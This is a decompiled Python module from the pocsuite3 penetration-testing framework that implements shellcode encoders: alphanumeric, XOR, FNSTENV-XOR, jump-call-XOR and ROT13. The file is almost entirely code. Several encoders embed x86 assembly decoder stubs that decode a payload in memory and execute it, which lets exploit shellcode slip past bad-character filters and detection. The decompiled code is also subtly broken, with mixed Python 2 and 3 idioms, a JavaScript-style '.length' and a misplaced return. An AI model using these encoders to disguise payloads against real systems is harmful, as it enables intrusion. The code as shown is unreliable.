# uncompyle6 version 3.6.7
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /Users/boyhack/programs/pocsuite3/pocsuite3/shellcodes/encoder.py
# Compiled at: 2019-03-15 03:35:12
# Size of source mod 2**32: 21045 bytes
from random import *
import types
from pocsuite3.lib.core.common import create_shellcode
from pocsuite3.lib.core.enums import ENCODER_TPYE

class EncoderError(Exception):
    pass


class Encoder(object):

    def encode(self, payload):
        return payload


class AlphanumericEncoder(Encoder):

    def __init__(self, disallowed_chars='\x00\r\n', buffer_register='ecx', offset=0):
        self.buffer_register = buffer_register
        self.allowed_chars = self.create_allowed_chars(disallowed_chars)
        self.offset = offset

    @staticmethod
    def create_allowed_chars(bad_chars):
        allowed_chars = range(97, 123) + range(66, 91) + range(48, 58)
        for ch in bad_chars:
            if ord(ch) in allowed_chars:
                allowed_chars.remove(ord(ch))

        return allowed_chars

    def encode(self, payload):
        shell = [ord(c) for c in payload]
        reg = self.buffer_register.upper()
        stub = self.create_decoder_stub(reg)
        offset = 0
        encoded = ''
        while offset < len(shell):
            block = shell[offset:offset + 1]
            encoded += self.encode_byte(block)
            offset += 1

        return stub + encoded + 'AA'

    def create_decoder_stub(self, reg):
        decoder = self.gen_decoder_prefix(reg) + 'jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI'
        return decoder

    def gen_decoder_prefix(self, reg):
        if self.offset > 32:
            raise Exception('Critical: Offset is greater than 32')
        elif self.offset <= 16:
            nop = 'C' * self.offset
            mod = 'I' * (16 - self.offset) + nop + '7QZ'
            edxmod = 'J' * (17 - self.offset)
        else:
            mod = 'A' * (self.offset - 16)
            nop = 'C' * (16 - mod.length)
            mod += nop + '7QZ'
            edxmod = 'B' * (17 - (self.offset - 16))
        regprefix = {'EAX':'PY' + mod, 
         'ECX':'I' + mod, 
         'EDX':edxmod + nop + '7RY', 
         'EBX':'SY' + mod, 
         'ESP':'TY' + mod, 
         'EBP':'UY' + mod, 
         'ESI':'VY' + mod, 
         'EDI':'WY' + mod}
        reg = reg.upper()
        if reg not in regprefix.keys():
            raise Exception('Invalid register name')
        return regprefix[reg]

    def encode_byte(self, block):
        nibble_chars = [[], [], [], [], [], [], [], [], [], [], [], [], [], [], [], []]
        for ch in self.allowed_chars:
            nibble_chars[(ch & 15)].append(chr(ch))

        poss_encodings = []
        block_low_nibble = block[0] & 15
        block_high_nibble = block[0] >> 4
        first_chars = nibble_chars[block_low_nibble]
        for first_char in first_chars:
            first_high_nibble = ord(first_char[0]) >> 4
            second_low_nibble = (block_high_nibble ^ first_high_nibble) & 15
            second_chars = nibble_chars[second_low_nibble]
            for second_char in second_chars:
                poss_encodings.append(second_char + first_char)

            if len(poss_encodings) == 0:
                raise Exception('No encoding of 0x%02x possible with limited character set' % block)
            return poss_encodings[randint(0, len(poss_encodings) - 1)]


class XorEncoder(Encoder):

    def __init__(self, disallowed_chars=(0, 13, 10)):
        self._disallowed_chars = self.set_disallowed_chars(disallowed_chars)
        self._usable_chars = set(range(256)) - self._disallowed_chars

    @staticmethod
    def set_disallowed_chars(chars):
        new_chars = set()
        for char in chars:
            new_chars.add(ord(char))

        return new_chars

    def _get_supported_register_sets(self):
        return []

    def _get_register_set(self, register_set):
        return {}

    def _get_header(self):
        return []

    def _get_payload_size_position(self):
        raise NotImplementedError()

    def _get_xor_key_position(self):
        raise NotImplementedError()

    def _encode_payload(self, payload, register_sets):
        buffer = []
        if isinstance(payload, types.StringTypes):
            buffer.extend((ord(x) & 255 for x in payload))
        else:
            buffer.extend(payload)
        for c in self._usable_chars:
            ret = buffer[:]
            for i in range(len(ret)):
                ret[i] = ret[i] ^ c
                if ret[i] in self._disallowed_chars:
                    break
            else:
                self._xor_key = c
                break

        else:
            raise EncoderError('cannot encode')

        return ret

    def _prefix_header(self, payload, register_sets):
        ret = self._get_header()
        payload_len = 65536 - len(payload)
        payload_size_pos = self._get_payload_size_position()
        ret[payload_size_pos] = payload_len & 255
        ret[payload_size_pos + 1] = (payload_len & 65280) >> 8
        xor_key_pos = self._get_xor_key_position()
        for reg_set in register_sets:
            for pos, value in self._get_register_set(reg_set).iteritems():
                ret[pos] = value

            for i, c in enumerate(ret):
                if c in self._disallowed_chars and i != xor_key_pos:
                    break
            else:
                break

        else:
            raise EncoderError('cannot encode')

        ret[xor_key_pos] = self._xor_key
        ret.extend(payload)
        return ret

    def encode(self, payload, register_sets=[]):
        """Encode payload.

        :param payload: the payload, either a string or a sequence of bytes
        :param register_sets: a sequence of registers to try in shellcode
        header. Sample names include 'eax', 'edx', and 'ebx'.
        :return: a sequence of encoded bytes
        """
        if len(payload) == 0:
            return []
        else:
            if len(payload) > 65535:
                raise EncoderError('cannot encode')
            assert self._usable_chars, 'cannot encode'
        if not register_sets:
            register_sets = self._get_supported_register_sets()
        encoded_payload = self._encode_payload(payload, register_sets)
        ret = self._prefix_header(encoded_payload, register_sets)
        return ret

    def encode_to_string(self, payload, register_sets=[]):
        """Encode payload. Return a string.

        :see: encode
        """
        return ''.join((chr(x) for x in self.encode(payload, register_sets)))


class FnstenvXorEncoder(XorEncoder):
    """FnstenvXorEncoder"""
    HEADER = [
     217, 225,
     217, 52, 36,
     90,
     90,
     90,
     90,
     128, 234, 231,
     49, 201,
     102, 129, 233, 161, 254,
     128, 50, 153,
     66,
     226, 250]
    REGISTER_SET = {'edx':{5:90, 
      6:90,  7:90,  8:90,  9:128,  10:234,  20:50, 
      22:66}, 
     'eax':{5:88, 
      6:88,  7:88,  8:88,  9:128, 
      10:232,  20:48, 
      22:64}, 
     'ebx':{5:91, 
      6:91,  7:91,  8:91,  9:128,  10:235,  20:51, 
      22:67}}
    XOR_KEY_POSITION = 21
    PAYLOAD_SIZE_POSITION = 17

    def _get_supported_register_sets(self):
        return FnstenvXorEncoder.REGISTER_SET.keys()

    def _get_register_set(self, register_set):
        return FnstenvXorEncoder.REGISTER_SET[register_set]

    def _get_header(self):
        return FnstenvXorEncoder.HEADER[:]

    def _get_payload_size_position(self):
        return FnstenvXorEncoder.PAYLOAD_SIZE_POSITION

    def _get_xor_key_position(self):
        return FnstenvXorEncoder.XOR_KEY_POSITION


class JumpCallXorEncoder(XorEncoder):
    HEADER = [
     235, 16,
     91,
     49, 201,
     102, 129, 233, 161, 254,
     128, 51, 153,
     67,
     226, 250,
     235, 5,
     232, 235, 255, 255, 255]
    REGISTER_SET = {'eax':{2:88, 
      11:48,  13:64}, 
     'ebx':{2:91, 
      11:51,  13:67}, 
     'edx':{2:90, 
      11:50,  13:66}}
    XOR_KEY_POSITION = 12
    PAYLOAD_SIZE_POSITION = 8

    def _get_header(self):
        return JumpCallXorEncoder.HEADER[:]

    def _get_supported_register_sets(self):
        return JumpCallXorEncoder.REGISTER_SET.keys()

    def _get_register_set(self, register_set):
        return JumpCallXorEncoder.REGISTER_SET[register_set]

    def _get_payload_size_position(self):
        return JumpCallXorEncoder.PAYLOAD_SIZE_POSITION

    def _get_xor_key_position(self):
        return JumpCallXorEncoder.XOR_KEY_POSITION


class CodeEncoders:
    """CodeEncoders"""

    def __init__(self, OS_SYSTEM, OS_TARGET, OS_TARGET_ARCH, BADCHARS):
        self.name = ''
        self.OS_SYSTEM = OS_SYSTEM
        self.OS_TARGET = OS_TARGET
        self.OS_TARGET_ARCH = OS_TARGET_ARCH
        self.BADCHARS = BADCHARS
        self.TMP_DIR = 'tmp'
        self.step = 0
        self.max_steps = 20

    def encode_shellcode(self, _byte_array, encoder_type, debug=0):
        """Encodes shellcode and returns encoded shellcode
        :param encoder_type: const of EncoderType
        """
        encoded_shellcode = ''
        if encoder_type == ENCODER_TPYE.XOR or encoder_type == 1:
            encoded_shellcode = self.xor_encoder(_byte_array, debug)
        elif encoder_type == ENCODER_TPYE.ALPHANUMERIC:
            encoded_shellcode = self.alphanum_encoder(_byte_array, debug)
        elif encoder_type == ENCODER_TPYE.ROT_13:
            encoded_shellcode = self.rot_13_encoder(_byte_array, debug)
        elif encoder_type == ENCODER_TPYE.FNSTENV_XOR:
            encoded_shellcode = self.fnst_encoder(_byte_array, debug)
        elif encoder_type == ENCODER_TPYE.JUMPCALL_XOR:
            encoded_shellcode = self.jumpcall_encoder(_byte_array, debug)
        else:
            print('There no encoder of this type')
            return
        return encoded_shellcode

    def clean_bad_chars(self, orig_array, payload):
        if not self.BADCHARS:
            print('You must specify some params')
            return
        for k in self.BADCHARS:
            if k in payload:
                payload = self.xor_bytes(orig_array)

        return payload

    def xor_bytes(self, byte_array):
        rnd = randint(1, 255)
        xor1 = rnd ^ byte_array[0]
        xor2 = xor1 ^ byte_array[1]
        xor3 = xor2 ^ byte_array[2]
        xor_array = bytearray()
        xor_array.append(rnd)
        xor_array.append(xor1)
        xor_array.append(xor2)
        xor_array.append(xor3)
        return self.clean_bad_chars(byte_array, xor_array)

    def xor_decoder(self, _shellcode, debug=0):
        """
            The decoder stub is a small chunk of instructions
            that is prepended to the encoded payload.
            When this new payload is executed on the target system,
            the decoder stub executes first and is responsible for
            decoding the original payload data. Once the original
            payload data is decoded, the decoder stub passes execution
            to the original payload. Decoder stubs generally perform a
            reversal of the encoding function, or in the case of an XOR
            obfuscation encoding, simply perform the XOR again against
            the same key value.
        """
        asm_code = '\nglobal _start\n\nsection .text\n_start:\n    jmp get_shellcode\n\ndecoder:\n    pop esi         ;pointer to shellcode\n    push esi        ;save address of shellcode for later execution\n    mov edi, esi    ;copy address of shellcode to edi to work with it\n\n    xor eax, eax    ;clear first XOR-operand register\n    xor ebx, ebx    ;clear second XOR-operand register\n    xor ecx, ecx    ;clear inner loop-counter\n    xor edx, edx    ;clear outer loop-counter\n\nloop0:\n    mov al, [esi]   ;get first byte from the encoded shellcode\n    mov bl, [esi+1] ;get second byte from the encoded shellcode\n    xor al, bl      ;xor them (result is saved to eax)\n    mov [edi], al   ;save (decode) to the same memory location as the encoded shellcode\n    inc edi         ;move decoded-pointer 1 byte onward\n    inc esi         ;move encoded-pointer 1 byte onward\n    inc ecx         ;increment inner loop-counter\n    cmp cl, 0x3     ;dealing with 4byte-blocks!\n    jne loop0\n\n    inc esi         ;move encoded-pointer 1 byte onward\n    xor ecx, ecx    ;clear inner loop-counter\n    add dx, 0x4     ;move outer loop-counter 4 bytes onward\n    cmp dx, len     ;check whether the end of the shellcode is reached\n    jne loop0\n\n    call [esp]      ;execute decoded shellcode\n\nget_shellcode:\n    call decoder\n    shellcode: db USER_SHELLCODE\n    len:    equ $-shellcode\n\n'
        asm_code = asm_code.replace('USER_SHELLCODE', _shellcode)
        encoded_shellcode, _ = create_shellcode(asm_code, (self.OS_TARGET), (self.OS_TARGET_ARCH), debug=debug)
        return encoded_shellcode

    def xor_encoder(self, _byte_arr, debug=0):
        self.step += 1
        shellcode = bytearray(_byte_arr)
        if len(shellcode) % 3 == 1:
            shellcode.append(144)
            shellcode.append(144)
        elif len(shellcode) % 3 == 2:
            shellcode.append(144)
        final = ''
        for i in range(0, len(shellcode), 3):
            tmp_block = bytearray()
            tmp_block.append(shellcode[i])
            tmp_block.append(shellcode[(i + 1)])
            tmp_block.append(shellcode[(i + 2)])
            tmp = self.xor_bytes(tmp_block)
            for y in tmp:
                if len(str(hex(y))) == 3:
                    final += str(hex(y)[:2]) + '0' + str(hex(y)[2:]) + ','
                else:
                    final += hex(y) + ','

        final = final[:-1]
        encoded_shellcode = self.xor_decoder(final, debug)
        for i in self.BADCHARS:
            if i in encoded_shellcode:
                print('Founding BADHCARS')
                if self.step < self.max_steps:
                    return self.xor_encoder(_byte_arr, debug)
                return

        return encoded_shellcode

    def rot_13_decoder(self, _shellcode, debug=0):
        """
            The decoder stub
        """
        n = 13
        n_hex = hex(n)
        asm_code = '\nglobal _start\n\nsection .text\n\n_start:\n    jmp short call_decoder\n\ndecoder:\n    pop esi                     ; shellcode address\n    xor ecx, ecx                ; zero out ecx\n    mov cl, len                 ; initialize counter\n\ndecode:\n    cmp byte [esi], %s          ; can we substract 13?\n    jl wrap_around              ; nope, we need to wrap around\n    sub byte [esi], %s          ; substract 13\n    jmp short process_shellcode ; process the rest of the shellcode\n\nwrap_around:\n    xor edx, edx                ; zero out edx\n    mov dl, %s                  ; edx = 13\n    sub dl, byte [esi]          ; 13 - shellcode byte value\n    xor ebx,ebx                 ; zero out ebx\n    mov bl, 0xff                ; store 0x100 without introducing null bytes\n    inc ebx\n    sub bx, dx                  ; 256 - (13 - shellcode byte value)\n    mov byte [esi], bl          ; write decoded value\n\nprocess_shellcode:\n    inc esi                     ; move to the next byte\n    loop decode                 ; decode current byte\n    jmp short shellcode         ; execute decoded shellcode\n\ncall_decoder:\n    call decoder\n    shellcode:\n        db USER_SHELLCODE\n    len: equ $-shellcode\n' % (n_hex, n_hex, n_hex)
        asm_code = asm_code.replace('USER_SHELLCODE', _shellcode)
        encoded_shellcode, _ = create_shellcode(asm_code, (self.OS_TARGET), (self.OS_TARGET_ARCH), debug=debug)
        return encoded_shellcode

    def rot_13_encoder(self, _shellcode, debug=0):
        """
            ROT13 ("rotate by 13 places", sometimes hyphenated ROT-13)
            is a simple letter substitution cipher that replaces a letter
            with the letter 13 letters after it in the alphabet. ROT13
            is a special case of the Caesar cipher, developed in ancient Rome.
        """
        n = 13
        max_value_without_wrapping = 256 - n
        encoded_shellcode = ''
        db_shellcode = []
        for x in bytearray(_shellcode):
            if x < max_value_without_wrapping:
                encoded_shellcode += '\\x%02x' % (x + n)
                db_shellcode.append('0x%02x' % (x + n))
            else:
                encoded_shellcode += '\\x%02x' % (n - 256 + x)
                db_shellcode.append('0x%02x' % (n - 256 + x))

        encode_shellcode = self.rot_13_decoder(','.join(db_shellcode), debug)
        return encode_shellcode

    def fnst_encoder(self, _byte_array, debug):
        encoder = FnstenvXorEncoder(self.BADCHARS)
        shellcode = _byte_array
        encoded_shell = encoder.encode_to_string(shellcode)
        if debug:
            print('Len of encoded shellcode:', len(encoded_shell))
        return encoded_shell

    def jumpcall_encoder(self, _byte_array, debug):
        encoder = JumpCallXorEncoder(self.BADCHARS)
        shellcode = _byte_array
        encoded_shell = encoder.encode_to_string(shellcode)
        if debug:
            print('Len of encoded shellcode:', len(encoded_shell))
        return encoded_shell

    def alphanum_encoder(self, byte_str, debug=0, buffer_register='ecx'):
        encoder = AlphanumericEncoder((self.BADCHARS), buffer_register=buffer_register)
        encoded_shell = encoder.encode(byte_str)
        if debug:
            print('Length of encoded shellcode: %s' % len(encoded_shell))
            print(''.join(('\\x%02x' % ord(c) for c in encoded_shell)))
        return encoded_shell